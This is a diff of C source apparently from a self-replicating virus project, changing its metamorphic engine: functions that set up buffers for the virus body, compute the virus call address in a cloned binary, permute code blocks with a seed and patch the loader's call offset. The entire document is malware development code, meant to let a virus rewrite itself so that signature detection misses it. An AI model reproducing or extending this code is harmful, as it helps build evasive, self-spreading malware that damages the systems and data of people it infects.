@@ -35,9 +35,9 @@ static bool	setup_input_buffer(struct safe_ptr *input, void *clone_virus, \
 			size_t virus_size)
 {
 	*input = (struct safe_ptr){
-		.ptr  = sys_mmap(0, virus_size * 2, PROT_READ | PROT_WRITE, // TODO
+		.ptr  = sys_mmap(0, virus_size, PROT_READ | PROT_WRITE, // TODO
 			MAP_ANON | MAP_PRIVATE, -1, 0),
-		.size = virus_size * 2
+		.size = virus_size
 	};
 
 	if (input->ptr == NULL) return errors(ERR_SYS, _ERR_MMAP_FAILED);
@@ -58,38 +58,22 @@ static bool	setup_output_buffer(struct safe_ptr *output, void *clone_virus, \
 	return true;
 }
 
-static bool	get_virus_address(struct safe_ptr clone, size_t loader_off, \
-			size_t *virus_address)
+static bool	get_input_virus_address(struct safe_ptr clone, size_t loader_off, \
+			void *clone_virus, void *input_virus, size_t *input_virus_address)
 {
 	size_t	dist_loader_entry_vircall = call_virus - loader_entry;
 	size_t	off_vircall = loader_off + dist_loader_entry_vircall;
 
-	void	*call_code = safe(clone, off_vircall, 5);
-	if (call_code == NULL) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+	void	*clone_call_code = safe(clone, off_vircall, 5);
+	if (clone_call_code == NULL) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
 
-	int32_t	*call_arg = (call_code + 1);
+	int32_t	*clone_call_arg = (clone_call_code + 1);
+	void	*new_clone_virus = (void*)((ssize_t)(clone_call_code + 5) + *clone_call_arg);
 
-	*virus_address = (size_t)((ssize_t)(call_code + 5) + *call_arg);
+	*input_virus_address = (size_t)input_virus + (new_clone_virus - clone_virus);
+
 	return true;
 }
-
-// static bool	set_virus_shift(struct safe_ptr input, size_t loader_off, \
-// 			size_t virus_address, int *virus_func_shift)
-// {
-// 	size_t	dist_loader_entry_vircall = call_virus - loader_entry;
-// 	size_t	off_vircall = loader_off + dist_loader_entry_vircall;
-//
-// 	void	*call_code = safe(input, off_vircall, 5);
-// 	if (call_code == NULL) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
-//
-// 	int32_t	*call_arg = (call_code + 1);
-// 	void	*end_call = (call_code + 5);
-// 	size_t	old_virus_address = (size_t)(end_call + *call_arg);
-//
-// 	*virus_func_shift = (int)(virus_address - old_virus_address);
-//
-// 	return true;
-// }
 
 static bool	adapt_virus_call_in_loader(struct safe_ptr clone_ref, size_t loader_off, \
 			int32_t virus_func_shift)
@@ -124,24 +108,22 @@ bool		metamorph_self(struct safe_ptr clone, size_t *virus_size, \
 
 	struct safe_ptr	input_buffer;
 	struct safe_ptr	output_buffer;
-	size_t		virus_address;
+	size_t		input_virus_address;
 	int32_t		virus_func_shift = 0;
 
 	if (!setup_input_buffer(&input_buffer, clone_virus, *virus_size)
 	||  !setup_output_buffer(&output_buffer, clone_virus, clone.size, loader_size)
-	||  !get_virus_address(input_buffer, loader_off, &virus_address))
+	||  !get_input_virus_address(clone, loader_off, clone_virus, input_buffer.ptr, &input_virus_address))
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 
 	// metamorph self and client
 	if (!true
 	// || !permutate_registers(clone_loader, seed, loader_size)
-	|| !permutate_blocks(input_buffer, output_buffer, virus_size, virus_address, &virus_func_shift, seed)
+	|| !permutate_blocks(input_buffer, output_buffer, virus_size, input_virus_address, &virus_func_shift, seed)
 	|| !adapt_virus_call_in_loader(clone, loader_off, virus_func_shift)
 	|| !free_accessor(&input_buffer)
 	|| !true)
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
-
-	log_virus_func_shift(virus_func_shift);
 
 	return true;
 }
